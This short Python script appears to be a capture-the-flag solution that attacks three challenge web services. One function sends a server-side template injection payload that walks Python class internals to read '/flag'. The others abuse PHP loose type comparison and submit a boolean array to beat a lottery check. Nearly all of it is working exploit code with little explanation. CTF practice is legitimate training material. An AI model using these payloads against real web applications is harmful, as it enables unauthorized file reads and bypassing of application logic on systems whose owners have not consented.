import requests
from lxml import etree


def baby_python(url):
    url = url + '/404?msg={{"".__class__.__mro__.__getitem__(2).__subclasses__().pop(40)("/flag").read()}}'
    html = etree.HTML(requests.get(url).text)
    print(html.xpath('//body/text()')[2].strip())


# "string"==1 返回true，弱类型比较
def php(url):
    url += '/index.php?aaa=1w&bbb={"ccc":"2018w","ddd":[["XMAN"],0]}'
    print(requests.get(url).text.split('.')[1])


def lottery(url):
    data = {"action": "buy", "numbers": [True,True,True,True,True,True,True ]}
    print(requests.post(url,data=data).text)


if __name__ == '__main__':
    baby_python('http://10.131.64.209:21420')
